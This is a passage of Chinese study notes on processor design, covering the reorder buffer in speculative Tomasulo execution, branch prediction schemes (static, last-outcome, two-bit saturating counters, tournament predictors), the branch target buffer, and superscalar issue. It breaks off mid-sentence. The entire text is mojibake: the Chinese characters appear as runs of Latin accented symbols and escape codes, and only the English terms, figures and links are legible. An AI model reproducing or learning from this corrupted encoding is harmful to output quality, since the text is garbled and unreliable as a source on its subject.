ä¸€ä¸ªé˜¶æ®µï¼Œç”¨æ¥ç­‰å¾…åˆ†æ”¯ç»“æœå¹¶çœŸæ­£æ›´æ–°å¯„å­˜å™¨ï¼Œç§°ä¸ºCommité˜¶æ®µ ROBä¹Ÿæ˜¯æ•°æ®æºä¹‹ä¸€ï¼šä¿å­˜åœ¨ROBä¸­çš„ç»“æœæ•°æ®éœ€è¦å‰é€ç»™åç»­æŒ‡ä»¤ ROBä¸­çš„ç»“æœæ˜¯æŒ‰ç…§ç¨‹åºé¡ºåºCommitçš„ çŒœæµ‹é”™è¯¯æ—¶ï¼Œé€šè¿‡æ¸…é™¤ROBä¸­çš„ç›¸å…³æ¡ç›®è¿›è¡Œå›æ»š ä¸Tomasuloç®—æ³•çš„ç»“æ„åŸºæœ¬ç›¸åŒï¼ŒåŒºåˆ«ä¸»è¦æœ‰å››ç‚¹ï¼š\nå¼•å…¥äº†Reorder Buffer CDBä¸å†ç›´æ¥å†™å¯„å­˜å™¨æ–‡ä»¶ï¼Œè€Œæ˜¯å†™å…¥åˆ°ROBä¸­ ä¿ç•™ç«™ä¸ä»…ä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å–æºæ“ä½œæ•°ï¼Œä¹Ÿä»ROBä¸­è¯»å– å–æ¶ˆäº†Store Bufferï¼ˆå…¶åŠŸèƒ½æ”¹ç”±ROBæ‰¿æ‹…ï¼‰ CDBä¸Šçš„æ•°æ®æ ‡ç­¾æœ‰å˜åŒ– ç”Ÿäº§æŒ‡ä»¤çš„ä¿ç•™ç«™ç¼–å·-\u0026gt;ç”Ÿäº§æŒ‡ä»¤çš„ROBç¼–å· ä¿ç•™ç«™æ•°æ®ç»“æ„æœ‰å˜åŒ– éœ€è¦å¢åŠ ä¸€ä¸ªå­—æ®µï¼Œè®°å½•ä¸ä¹‹å…³è”çš„ROBç¼–å·ï¼Œä½œä¸ºå°†æ¥æ”¾ç½®åˆ°CDBä¸Šçš„æ•°æ®æ ‡ç­¾ é˜¶æ®µ æ“ä½œ Issue 1ï¼‰ä»æŒ‡ä»¤é˜Ÿåˆ—å–å‡ºä¸‹ä¸€æ¡æŒ‡ä»¤ 2ï¼‰åˆ†é…ä¸€ä¸ªç©ºé—²çš„ä¿ç•™ç«™å’ŒROBï¼ˆå¦‚æœæ²¡æœ‰åˆ™åœé¡¿æ•´ä¸ªæµæ°´çº¿ï¼‰\n3ï¼‰å°†æŒ‡ä»¤ä¿¡æ¯å¡«å…¥æ‰€åˆ†é…çš„ä¿ç•™ç«™å’ŒROB\n4ï¼‰ä»å¯„å­˜å™¨æ–‡ä»¶æˆ–ROBä¸­è¯»å–å·²å°±ç»ªçš„æ“ä½œæ•°ï¼Œæ”¾å…¥ä¿ç•™ç«™ä¸­ï¼Œæˆ–åœ¨ä¿ç•™ç«™ä¸­è®°å½•æœªå°±ç»ªçš„æ“ä½œæ•°æ‰€åœ¨çš„ROBç¼–å· Execute ç›‘æ§CDBï¼Œç­‰å¾…æ‰€æœ‰æ“ä½œæ•°å‡å°±ç»ªï¼Œç„¶åå¼€å§‹æ‰§è¡Œè¯¥æŒ‡ä»¤ã€‚\nâ€¢LoadæŒ‡ä»¤çš„æ‰§è¡Œä»åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š1ï¼‰è®¡ç®—è®¿å­˜åœ°å€ï¼›2ï¼‰è®¿é—®å†…å­˜ â€¢StoreæŒ‡ä»¤åªéœ€è¦è®¡ç®—è®¿å­˜åœ°å€ â€¢Load/storeæŒ‡ä»¤ä»æŒ‰ç…§ç¨‹åºé¡ºåºè®¡ç®—è®¿å­˜åœ°å€ Write result â€¢å¯¹äºstoreæŒ‡ä»¤ï¼šç›‘æ§CDBï¼Œç­‰å¾…è¦å†™å…¥å†…å­˜çš„æ•°æ®ï¼Œæ”¶åˆ°åå°†å…¶å†™å…¥è‡ªèº«ROBï¼Œå¹¶é‡Šæ”¾ä¿ç•™ç«™ â€¢å¯¹äºå…¶å®ƒæŒ‡ä»¤ï¼Œç­‰å¾…ç»“æœäº§ç”Ÿï¼Œå°†å…¶è¿åŒæ ‡ç­¾ï¼ˆå³ç”Ÿäº§æŒ‡ä»¤çš„ROBç¼–å·ï¼‰å¹¿æ’­åˆ°CDBä¸Šï¼Œè¿›è€Œå†™å…¥å¯¹åº”ROBå’Œæ‰€æœ‰éœ€è¦å®ƒçš„ä¿ç•™ç«™ï¼Œæœ€åé‡Šæ”¾ä¿ç•™ç«™ Commit ç­‰å¾…æ­¤æŒ‡ä»¤åˆ°è¾¾ROBé˜Ÿåˆ—å¤´éƒ¨ï¼Œç„¶åæ ¹æ®æŒ‡ä»¤ç±»å‹åˆ†åˆ«å¤„ç†ï¼š â€¢å¯¹äºåˆ†æ”¯æŒ‡ä»¤ï¼šå¦‚æœé¢„æµ‹æ­£ç¡®ï¼Œé‡Šæ”¾ROBå³å¯ï¼Œå¦åˆ™æ¸…ç©ºæ‰€æœ‰å…¶å®ƒROBå’Œä¿ç•™ç«™ï¼ˆç›¸å½“äºæ”¾å¼ƒæ‰€æœ‰çŒœæµ‹æ‰§è¡Œçš„æŒ‡ä»¤ï¼‰ â€¢å¯¹äºstoreæŒ‡ä»¤ï¼šæ›´æ–°å†…å­˜ï¼Œå¹¶é‡Šæ”¾ROB â€¢å¯¹äºå…¶å®ƒæŒ‡ä»¤ï¼šæ›´æ–°å¯„å­˜å™¨æ–‡ä»¶ï¼Œå¹¶é‡Šæ”¾ROB WAR/WAWï¼šä¸å­˜åœ¨\nå½“ä¸€æ¡storeæŒ‡ä»¤æäº¤æ—¶ï¼Œæ‰€æœ‰å‰åºæŒ‡ä»¤å‡å·²æäº¤å®Œæ¯•ï¼Œä¸å¯èƒ½å­˜åœ¨å°šæœªå®Œæˆè¯»å–çš„loadæŒ‡ä»¤ï¼Œä¹Ÿä¸å¯èƒ½å­˜åœ¨å°šæœªå®Œæˆå†™å‡ºçš„storeæŒ‡ä»¤ RAWï¼šå¯èƒ½å­˜åœ¨\nLoadæŒ‡ä»¤åœ¨è¿›å…¥Executeé˜¶æ®µç¬¬äºŒæ­¥ä¹‹å‰ï¼Œéœ€è¦ç¡®è®¤ROBä¸­ä¸å­˜åœ¨æŒ‡å‘ç›¸åŒå†…å­˜ä½ç½®çš„å‰åºstoreæŒ‡ä»¤ çŒœæµ‹æ‰§è¡Œçš„ä»£ä»·\nå› é¢„æµ‹é”™è¯¯å¯¼è‡´æœ¬ä¸è¯¥æ‰§è¡Œçš„æŒ‡ä»¤è¢«å®é™…çš„æ‰§è¡Œäº†ï¼Œå¸¦æ¥äº†æ— ç”¨åŠŸè€—\nå¯¹ä¸è¯¥æ‰§è¡Œçš„æŒ‡ä»¤è¿›è¡Œå›æ»šï¼Œä¹Ÿéœ€è¦æ¶ˆè€—æ—¶é—´å’ŒåŠŸè€—\nå¤„ç†çŒœæµ‹æ‰§è¡Œçš„æŒ‡ä»¤å¯¼è‡´çš„ä¾‹å¤–ï¼Œä¹Ÿå¯èƒ½ä¼šå¼•å…¥ä¸å¿…è¦çš„å¼€é”€\nä»£ä»·çš„åº¦é‡ï¼šmisspeculationï¼ˆå› çŒœæµ‹é”™è¯¯å¯¼è‡´çš„æœ¬ä¸è¯¥æ‰§è¡Œçš„æŒ‡ä»¤æ‰€å çš„æ¯”ä¾‹ï¼‰\nç–‘é—®ï¼š\nä¸ºä»€ä¹ˆç¬¬ä¸€æ¡loadè¿›å…¥Commité˜¶æ®µï¼Œä¹Ÿå°±æ˜¯åœ¨Write Backé˜¶æ®µå®Œæˆåï¼Œç¬¬äºŒæ¡loadæ‰èƒ½è¿›å…¥executeé˜¶æ®µï¼Ÿ\n1.9 åˆ†æ”¯é¢„æµ‹ ï¼ˆ1ï¼‰é™æ€é¢„æµ‹\nâ€‹\tè¦è¿›è¡Œåˆ†æ”¯é¢„æµ‹ï¼Œå°±è¦é¢„æµ‹åˆ†æ”¯è·³è¿˜æ˜¯ä¸è·³ã€‚æœ€æœ´ç´ çš„æƒ³æ³•æ˜¯é¢„æµ‹ä¸€ç›´è·³æˆ–è€…ä¸€ç›´ä¸è·³ï¼Œè¿™æ ·çš„æ–¹æ³•è™½ç„¶ç®€å•ï¼Œä½†æ˜¯ä¹Ÿæ¯”å®Œå…¨ä¸é¢„æµ‹è¦é«˜æ˜ã€‚å®Œå…¨ä¸é¢„æµ‹æ˜¯100%åœ°è¦é˜»æ–­æµæ°´çº¿ï¼Œè€Œé¢„æµ‹ä¸€ç›´è·³æˆ–è€…é¢„æµ‹ä¸€ç›´ä¸è·³è¿˜æœ‰æœºä¼šé¢„æµ‹å¯¹ï¼Œé¢„æµ‹åˆ°å°±æ˜¯èµšåˆ°ã€‚é¢„æƒ³ä¸€ä¸ª1000æ¬¡çš„forå¾ªç¯ï¼Œè¿™ä¸ªå¾ªç¯å‰999æ¬¡éƒ½æ˜¯è·³è½¬è€Œæœ€åä¸€æ¬¡ä¸è·³è½¬ï¼Œå¦‚æœå¤„ç†å™¨è®¾ç½®ä¸ºé¢„æµ‹ä¸€å®šè·³è½¬ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿™æ®µæŒ‡ä»¤çš„æ—¶å€™å…¶å‡†ç¡®ç‡é«˜è¾¾99.9%ï¼Œæ€§èƒ½è¿œè¿œé«˜äºä¸åšé¢„æµ‹çš„å¤„ç†å™¨ã€‚\nâ€‹\tåŸºäºé‡åŒ–ç ”ç©¶æ–¹æ³•çš„æ€æƒ³ï¼ŒHPåœ¨ä»–ä»¬çš„è‘—ä½œä¸­è¯´å½“å‰ä¸–ç•Œä¸Šå¤§æ¦‚æœ‰20%çš„ä»£ç æ˜¯åˆ†æ”¯æŒ‡ä»¤ï¼Œå…¶ä¸­è·³è½¬å’Œä¸è·³è½¬çš„æ¯”ä¾‹æ˜¯1ï¼š1 ã€‚æŠŠè¿™ä¸ªæ•°æ®ä»£å…¥åˆ°ä¸Šä¸€æ®µè¯´çš„é¢„æµ‹æ–¹æ³•ä¸­å»ï¼Œå¤„ç†å™¨çš„CPI = 0.8 + 0.1 Ã— 1 + 0.1 Ã— 4 = 1.3 *ï¼Œ*æ•ˆæœæ˜¾è‘—ä¼˜äºå®Œå…¨ä¸åšé¢„æµ‹çš„æœºå™¨ã€‚\nâ€‹\tåœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šç•¥åŠ æ€è€ƒï¼Œæˆ‘ä»¬å‘ç°å¾ˆå¤šåˆ†æ”¯æŒ‡ä»¤æ˜¯æœ‰è§„å¾‹çš„ï¼Œæ¯”å¦‚forä»£ç æ®µçš„æœ€åä¸€æ¡åˆ†æ”¯æŒ‡ä»¤ï¼Œè¿™æ¡åˆ†æ”¯æŒ‡ä»¤ç»å¤§éƒ¨åˆ†æ—¶é—´æ˜¯å‘åè·³è½¬çš„ï¼Œè€Œforä»£ç åˆæ€»æ˜¯å‡ºç°ï¼Œå› æ­¤æå‡ºè¿™ä¹ˆä¸€ä¸ªæ–¹æ³•ï¼šå‘åè·³è½¬çš„åˆ†æ”¯æ€»æ˜¯æ‰§è¡Œï¼Œå‘å‰è·³è½¬çš„åˆ†æ”¯æ€»æ˜¯ä¸æ‰§è¡Œã€‚è¿™æ ·çš„å‡è®¾æ˜¯åŸºäºå®é™…ä»£ç æƒ…æ™¯çš„ï¼Œäº‹å®è¯æ˜è¿™æ ·åšçš„æ•ˆæœä¸é”™ã€‚\nï¼ˆ2ï¼‰æ ¹æ®æœ€åä¸€æ¬¡ç»“æœè¿›è¡Œé¢„æµ‹\nâ€‹\té™æ€åˆ†æ”¯é¢„æµ‹çš„æ–¹æ³•è™½ç„¶æ¯”ä¸é¢„æµ‹è¦å¥½ï¼Œä½†æ˜¯æ€§èƒ½å¹¶ä¸èƒ½è®©äººæ»¡æ„ã€‚æ¯”å¦‚é¢„æµ‹ä¸€å®šè·³è½¬ï¼Œå¦‚æœç¢°åˆ°åˆ†æ”¯æŒ‡ä»¤æ‰§è¡Œæƒ…å†µä¸ºNNNNNNï¼ˆNè¡¨ç¤ºNot takenï¼Œä¸åˆ†æ”¯ï¼‰ï¼Œé‚£ä¹ˆé”™è¯¯ç‡å°±é«˜è¾¾100%ï¼Œè¿™æ ·çš„æƒ…å†µæ˜¯æœ‰å¯èƒ½å‘ç”Ÿçš„ã€‚é™æ€å°±æ„å‘³ç€ä¸çµæ´»ï¼Œæˆ‘ä»¬éœ€è¦çµæ´»ä¸€äº›çš„æ–¹æ³•æ¥è§£å†³é—®é¢˜ï¼Œçµæ´»çš„æ–¹æ³•å¯ç¹å¯ç®€ï¼Œç®€å•çš„æ–¹æ³•å°±æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡åˆ†æ”¯æŒ‡ä»¤çš„æ‰§è¡Œæƒ…å†µæ¥é¢„æµ‹å½“å‰åˆ†æ”¯æŒ‡ä»¤ï¼Œå¦‚æœä¸Šä¸€æ¬¡æŒ‡ä»¤ä¸è·³è½¬ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡ç¢°åˆ°è¿™æ¡æŒ‡ä»¤å°±é¢„æµ‹ä¸è·³è½¬ï¼Œç”¨è¿™ä¸ªæ–¹æ³•æ¥é¢„æµ‹NNNNNNçš„è¯ï¼Œæ­£ç¡®ç‡å¯èƒ½é«˜è¾¾100%ï¼Œè¿™æ ·çš„ç»“æœè®©äººæ»¡æ„ã€‚\nï¼ˆ3ï¼‰åŸºäºä¸¤ä½é¥±å’Œè®¡æ•°å™¨çš„é¢„æµ‹\nâ€‹\tæ ¹æ®æœ€åä¸€æ¬¡ç»“æœè¿›è¡Œé¢„æµ‹ç¡®å®æœ‰ä¸€äº›æ•ˆæœï¼Œä½†æ˜¯å½“å®ƒç¢°åˆ°TNTNTNè¿™æ ·çš„æƒ…å†µï¼Œæ­£ç¡®ç‡åˆå¯èƒ½ä¼šä¸‹é™åˆ°0%ï¼Œè¿˜ä¸å¦‚é™æ€é¢„æµ‹ï¼Œé™æ€é¢„æµ‹è¿˜å¯èƒ½æœ‰50%åŠä»¥ä¸Šçš„æ­£ç¡®ç‡ã€‚\næ—¢è¦æ»¡è¶³NNNNNNè¿™æ ·çš„æƒ…å†µï¼Œåˆè¦è®©TNTNTNè¿™æ ·çš„æƒ…å†µçš„ç»“æœä¸è‡³äºå¤ªéš¾çœ‹ï¼Œè§£å†³çš„åŠæ³•æ˜¯åŸºäºä¸¤ä½é¥±å’Œè®¡æ•°å™¨çš„é¢„æµ‹ã€‚ä¸¤ä½é¥±å’Œè®¡æ•°å™¨ç”¨ä¸€ä¸ªçŠ¶æ€æœºæ¥è¡¨ç¤ºï¼ŒçŠ¶æ€æœºå¦‚ä¸‹å›¾ã€‚\nâ€‹\tä¸¤ä½é¥±å’Œè®¡æ•°å™¨åŒ…å«å››ä¸ªçŠ¶æ€ï¼š00ã€01ã€10ã€11 ã€‚å…¶ä¸­00ã€01è¡¨ç¤ºä¸è·³è½¬ï¼Œ10ã€11è¡¨ç¤ºè·³è½¬ã€‚00è¡¨ç¤ºå¼ºä¸è·³è½¬ï¼Œå½“è®¡æ•°å™¨å¤„äºè¿™ä¸ªçŠ¶æ€ï¼Œåˆ†æ”¯é¢„æµ‹ä¸è·³è½¬ï¼Œå¦‚æœé¢„æµ‹æ­£ç¡®ï¼Œè®¡æ•°å™¨ä¿æŒè®¡æ•°å€¼ï¼Œå¦‚æœé¢„æµ‹é”™è¯¯ï¼Œé‚£ä¹ˆçŠ¶æ€è½¬æ¢æˆ01ï¼Œå³å¼±ä¸è·³è½¬ï¼Œæ­¤æ—¶ä»ç„¶é¢„æµ‹åˆ†æ”¯ä¸è·³è½¬ï¼Œå¦‚æœé¢„æµ‹æ­£ç¡®ï¼ŒçŠ¶æ€è½¬å˜å›00ï¼Œå¦‚æœé¢„æµ‹é”™è¯¯ï¼ŒçŠ¶æ€è½¬å˜ä¸ºå¼±è·³è½¬10ã€‚åœ¨å¼±è·³è½¬10çš„çŠ¶æ€ä¸‹ï¼Œåˆ†æ”¯é¢„æµ‹è·³è½¬ï¼Œå¦‚æœé¢„æµ‹æ­£ç¡®ï¼ŒçŠ¶æ€è½¬å˜ä¸ºå¼ºè·³è½¬11ï¼Œå¦‚æœé¢„æµ‹é”™è¯¯ï¼ŒçŠ¶æ€è½¬å˜ä¸ºå¼±ä¸è·³è½¬01.åœ¨å¼ºè·³è½¬11çš„çŠ¶æ€ä¸‹ï¼Œåˆ†æ”¯é¢„æµ‹è·³è½¬ï¼Œå¦‚æœé¢„æµ‹æ­£ç¡®ï¼ŒçŠ¶æ€ä¿æŒä¸å˜ï¼Œå¦‚æœé¢„æµ‹é”™è¯¯ï¼ŒçŠ¶æ€è½¬å˜ä¸ºå¼±è·³è½¬10.\nâ€‹\tä¸Šè¿°çš„ä¸¤ä½é¥±å’Œè®¡æ•°å™¨åªæ˜¯ä¸€ç§é¢„æµ‹æ–¹æ³•ï¼Œå…¶ä»–çš„é¢„æµ‹æ–¹æ³•åŒ…æ‹¬ä¿®æ”¹ä¸¤ä½è®¡æ•°å™¨çš„çŠ¶æ€è½¬ç§»æƒ…å†µã€å¢å¤§è®¡æ•°å™¨ä½æ•°ï¼Œå¯¹äºä¸¤ä½é¥±å’Œè®¡æ•°å™¨è‡ªèº«è€Œè¨€ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®ä¸åŒçš„åˆå§‹çŠ¶æ€æ¥åŒºåˆ«åˆ«çš„ä¸¤ä½é¥±å’Œè®¡æ•°å™¨ã€‚\nï¼ˆ4ï¼‰åŸºäºå±€éƒ¨å†å²çš„åˆ†æ”¯é¢„æµ‹\nï¼ˆ5ï¼‰åŸºäºå…¨å±€å†å²çš„åˆ†æ”¯é¢„æµ‹\nï¼ˆ6ï¼‰ç«äº‰çš„åˆ†æ”¯é¢„æµ‹\nè¯¦ç»†å‚è€ƒåšå®¢ï¼š\nåˆ†æ”¯æŒ‡ä»¤ä¸åˆ†æ”¯é¢„æµ‹_Zkaisençš„åšå®¢-CSDNåšå®¢\nhttps://zhuanlan.zhihu.com/p/490749315\nç²¾ç¡®ä¾‹å¤–\næŒ‡åœ¨å¤„ç†ä¾‹å¤–çš„æ—¶å€™ï¼Œå‘ç”Ÿä¾‹å¤–æŒ‡ä»¤ä¹‹å‰æ‰€æœ‰çš„æŒ‡ä»¤éƒ½å·²ç»æ‰§è¡Œå®Œäº†ï¼Œä¾‹å¤–æŒ‡ä»¤åé¢çš„æ‰€æœ‰æŒ‡ä»¤éƒ½è¿˜æ²¡æ‰§è¡Œã€‚\nå‚è€ƒåšå®¢ï¼š[è®¡ç®—æœºä½“ç³»ç»“æ„â€”â€”ç²¾ç¡®ä¾‹å¤– \u0026amp; ROBè¯¦è§£ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/586221956#:~:text=ä¸Šä¸€ç¯‡æ–‡ç« æåˆ°çš„Tomasuloç®—æ³•ï¼Œæ˜¯ä¸€ä¸ªéç²¾ç¡®çš„ä¾‹å¤–ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦å‘ç”Ÿä¾‹å¤–ï¼Œç¡¬ä»¶å°±å¾ˆéš¾å¤„ç†ï¼Œå› ä¸ºæ˜¯ä¹±åºæ‰§è¡Œï¼Œæ€ä¹ˆæ‰èƒ½ç»™è½¯ä»¶ä¸€ä¸ªå¹²å‡€çš„ç°åœºå‘¢ï¼Ÿ æ‰€ä»¥æ“ä½œç³»ç»Ÿå°±å¸Œæœ›åŠ¨æ€æµæ°´çº¿æä¾›ç²¾ç¡®ä¾‹å¤–ã€‚,ç²¾ç¡®ä¾‹å¤– ï¼šæŒ‡åœ¨å¤„ç†ä¾‹å¤–çš„æ—¶å€™ï¼Œå‘ç”Ÿä¾‹å¤–æŒ‡ä»¤ä¹‹å‰æ‰€æœ‰çš„æŒ‡ä»¤éƒ½å·²ç»æ‰§è¡Œå®Œäº†ï¼Œä¾‹å¤–æŒ‡ä»¤åé¢çš„æ‰€æœ‰æŒ‡ä»¤éƒ½è¿˜æ²¡æ‰§è¡Œã€‚)\n2-ä½é¢„æµ‹å™¨ï¼šä»…åˆ©ç”¨åˆ†æ”¯æŒ‡ä»¤è‡ªèº«çš„å†å²è¡Œä¸ºæ¥é¢„æµ‹å®ƒçš„æœªæ¥è¡Œä¸º å…³è”é¢„æµ‹å™¨ï¼šç»¼åˆè€ƒè™‘ä¸åŒåˆ†æ”¯æŒ‡ä»¤çš„å†å²è¡Œä¸ºæ¥è¿›è¡Œé¢„æµ‹ (m, n)å…³è”é¢„æµ‹å™¨ï¼šåˆ©ç”¨mä¸ªæœ€è¿‘æ‰§è¡Œçš„åˆ†æ”¯æŒ‡ä»¤çš„è¡Œä¸ºï¼Œä»2^mä¸ªn-bité¢„æµ‹å™¨ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œç”¨æ¥å¯¹å½“å‰åˆ†æ”¯æŒ‡ä»¤è¿›è¡Œé¢„æµ‹ 2-bité¢„æµ‹å™¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªï¼ˆ0, 2ï¼‰é¢„æµ‹å™¨ é”¦æ ‡èµ›é¢„æµ‹å™¨ è®¾ç½®ä¸¤ä¸ªé¢„æµ‹å™¨ï¼Œä¸€ä¸ªä½¿ç”¨å…¨å±€å†å²è¿›è¡Œé¢„æµ‹ï¼Œä¸€ä¸ªä½¿ç”¨å±€éƒ¨å†å²è¿›è¡Œé¢„æµ‹ï¼Œå†è®¾ç½®ä¸€ä¸ªé€‰æ‹©å™¨ï¼Œç”¨æ¥å†³å®šå…·ä½“ä½¿ç”¨å“ªä¸ªé¢„æµ‹å™¨æ¥å¯¹å½“å‰åˆ†æ”¯æŒ‡ä»¤è¿›è¡Œé¢„æµ‹ å…¨å±€é¢„æµ‹å™¨ï¼šä½¿ç”¨æœ€è¿‘12ä¸ªåˆ†æ”¯çš„è·³è½¬æƒ…å†µä½œä¸ºç´¢å¼•ï¼ŒæŸ¥æ‰¾ä¸€ä¸ª4096å…¥å£çš„å…¨å±€é¢„æµ‹å™¨ï¼Œæ¯ä¸ªå…¥å£éƒ½æ˜¯ä¸€ä¸ªæ ‡å‡†çš„2ä½é¢„æµ‹å™¨ å±€éƒ¨é¢„æµ‹å™¨ï¼šåˆ†ä¸ºä¸¤å±‚ï¼Œä¸Šé¢ä¸€å±‚æ˜¯ä¸€ä¸ª1024å…¥å£çš„å±€éƒ¨å†å²è®°å½•è¡¨ï¼Œç”¨PCæœ€ä½10ä½ä½œä¸ºç´¢å¼•ï¼Œæ¯ä¸ªå…¥å£è®°å½•ç€ç›¸åº”åˆ†æ”¯æœ€è¿‘10æ¬¡çš„è·³è½¬æƒ…å†µï¼›ä¸‹é¢ä¸€å±‚æ˜¯ä¸€ä¸ª1024å…¥å£çš„3ä½é¢„æµ‹å™¨ï¼Œç”¨ä¸Šå±‚æ£€ç´¢å‡ºçš„10ä½å±€éƒ¨å†å²ç´¢å¼• é€‰æ‹©å™¨ï¼šæ˜¯ä¸€ä¸ª4096å…¥å£çš„2ä½é¢„æµ‹å™¨ï¼Œç”¨PCæœ€ä½12ä½ä½œä¸ºç´¢å¼•ã€‚é¢„æµ‹å™¨çš„å½“å‰å–å€¼å†³å®šäº†æ˜¯é‡‡ç”¨å…¨å±€é¢„æµ‹å™¨çš„ç»“æœï¼Œè¿˜æ˜¯é‡‡ç”¨å±€éƒ¨é¢„æµ‹å™¨çš„ç»“æœ. è¿”å›åœ°å€é¢„æµ‹å™¨ é€šå¸¸ç”¨æ ˆæ¥å®ç° CallæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå°†è¿”å›åœ°å€pushåˆ°æ ˆä¸­ RetæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œä»æ ˆä¸­popä¸€ä¸ªè¿”å›åœ°å€ï¼Œä½œä¸ºpredicted PC åˆ†æ”¯æŒ‡ä»¤çš„å»¶æ—¶æ¥è‡ªä¸¤ä¸ªæ–¹é¢ï¼Œä¸€æ˜¯åˆ†æ”¯æ¡ä»¶çš„è®¡ç®—ï¼ŒäºŒæ˜¯ç›®çš„åœ°å€çš„è®¡ç®— åˆ†æ”¯é¢„æµ‹æŠ€æœ¯ï¼ˆä¹Ÿç§°ä¸ºBHTæŠ€æœ¯ï¼‰åªå¯¹ç¬¬ä¸€ä¸ªé—®é¢˜æœ‰æ‰€å¸®åŠ© ä¸ºäº†å¿«é€Ÿå¾—åˆ°ç›®çš„åœ°å€ ï¼Œäººä»¬æå‡ºäº†Branch Target Bufferï¼ˆBTBï¼‰ BTBçš„ç»“æ„ç±»ä¼¼äºcacheï¼šæ¯è¡Œä¿å­˜ä¸€ä¸ªåˆ†æ”¯æŒ‡ä»¤åœ°å€å’Œä¸€ä¸ªé¢„æµ‹çš„PC ç”¨å½“å‰PCçš„ä½kä½ä½œä¸ºç´¢å¼•ï¼Œå–å‡ºä¸€ä¸ªè¡¨é¡¹ï¼Œç„¶åè¿›è¡Œç²¾ç¡®åŒ¹é…ï¼Œæœ€åå¾—åˆ°é¢„æµ‹çš„PC åœ¨IFé˜¶æ®µï¼Œåˆ©ç”¨å½“å‰PCåŒæ—¶æ£€ç´¢BHTå’ŒBTBï¼Œä½†ä»¥BHTçš„ç»“æœä¸ºä¸» BTBå‘½ä¸­ BTBæœªå‘½ä¸­ BHTé¢„æµ‹è·³è½¬ Predicted PC stall BHTé¢„æµ‹ä¸è·³è½¬ PC+4ï¼ˆä»¥BHTçš„é¢„æµ‹ä¸ºå‡†ï¼‰ PC+4 åœ¨ç›¸åº”åˆ†æ”¯æŒ‡ä»¤commitæ—¶è¿›è¡ŒBTB/BHTçš„æ›´æ–° 1.10 è¶…æ ‡é‡ æ ¸å¿ƒï¼šé€šè¿‡å¤šå‘å°„æ¥è¿›ä¸€æ­¥é™ä½CPI\næŠ€æœ¯è·¯çº¿ï¼š\né™æ€è°ƒåº¦çš„è¶…æ ‡é‡å¤„ç†å™¨ æ¯ä¸ªå‘¨æœŸå‘å°„å¤šæ¡æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨é™æ€è°ƒåº¦æµæ°´çº¿æ‰§è¡Œå®ƒä»¬ å¤šç”¨åœ¨åµŒå…¥å¼é¢†åŸŸï¼šMIPSå’ŒARMï¼ŒåŒ…æ‹¬ARM Cortex-A8 VLIW(Very Long Instruction Word)å¤„ç†å™¨ æ¯ä¸ªå‘¨æœŸå‘å°„ä¸€ä¸ªåŒ…å«å¤šæ¡æŒ‡ä»¤çš„è¶…é•¿æŒ‡ä»¤åŒ… æŒ‡ä»¤é—´çš„ä¾èµ–å…³ç³»åœ¨æŒ‡ä»¤åŒ…ä¸­æ˜ç¡®ç»™å‡ºï¼Œä¸éœ€è¦ç¡¬ä»¶è¿›è¡Œæ£€æµ‹ å¿…é¡»æœ‰ä¸“ç”¨ç¼–è¯‘å™¨çš„é…åˆ å¤šç”¨äºä¸“ç”¨å¤„ç†å™¨é¢†åŸŸï¼Œå¦‚TI C6x åŠ¨æ€è°ƒåº¦çš„è¶…æ ‡é‡å¤„ç†å™¨ æ¯ä¸ªå‘¨æœŸå‘å°„å¤šæ¡æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨åŠ¨æ€è°ƒåº¦æµæ°´çº¿æ‰§è¡Œå®ƒä»¬ Intel Core i3, i5, i7; AMD Phenom; IBM Power 7 å¤šå‘å°„å¯¹æµæ°´çº¿æ§åˆ¶é€»è¾‘çš„æ”¹é€ ä¸»è¦æœ‰ä¸¤ç‚¹ï¼š\nIssueé˜¶æ®µï¼šæ¯ä¸ªå‘¨æœŸè¦å°†å¤šæ¡æŒ‡ä»¤å‘å°„åˆ°ä¿ç•™ç«™å’ŒROBä¸­\nä¸ºæŒ‡ä»¤åŒ…ä¸­çš„æŒ‡ä»¤åˆ†é…ä¿ç•™ç«™å’ŒROBå…¥å£ åˆ†ææŒ‡ä»¤åŒ…ä¸­å„æŒ‡ä»¤ä¹‹é—´çš„ä¾èµ–å…³ç³» æ ¹æ®ä¾èµ–å…³ç³»åˆå§‹åŒ–æ‰€åˆ†é…çš„ä¿ç•™ç«™å’ŒROB Commité˜¶æ®µï¼šæ¯ä¸ªå‘¨æœŸè¦æäº¤å¤šæ¡æŒ‡ä»¤\nâ€‹\tå¦‚æœæäº¤é€Ÿåº¦å°äºå‘å°„é€Ÿåº¦ï¼Œæµæ°´çº¿æœ€ç»ˆä¹Ÿä¼šå µä½ã€‚è¿™é‡Œéš¾åº¦è¾ƒå°ï¼Œæ¯•ç«Ÿä¸éœ€è¦åˆ†æä¾èµ–å…³ç³»\nIssueé˜¶æ®µçš„å¤„ç†æ–¹å¼ï¼š\næ–¹å¼1ï¼šåœ¨æ—¶é’Ÿå‘¨æœŸä¸ŠåŠæ®µå‘å°„æŒ‡ä»¤#1ï¼Œåœ¨ä¸‹åŠæ®µå‘å°„æŒ‡ä»¤#2 ç®€å•ï¼Œä½†éš¾ä»¥å®ç°æ›´å¤šçš„æŒ‡ä»¤ æ–¹å¼2ï¼šæ„å»ºä¸€ä¸ªèƒ½å¤ŸåŒæ—¶å¤„ç†å¤šæ¡æŒ‡ä»¤å‘å°„çš„é€»è¾‘ èƒ½åŒæ—¶å¤„ç†å¤šæ¡æŒ‡ä»¤ï¼Œä½†å¤ªå¤æ‚ æ–¹å¼3ï¼šæ„å»ºä¸€ä¸ªèƒ½åŒæ—¶å¤„ç†å¤šæ¡æŒ‡ä»¤å‘å°„çš„å±€éƒ¨æµæ°´çº¿ åˆ†ä¸ºåˆ†é…èµ„æºã€åˆ†æä¾èµ–å’Œæ›´æ–°è¡¨æ ¼ä¸‰ä¸ªé˜¶æ®µ CPI=Ideal 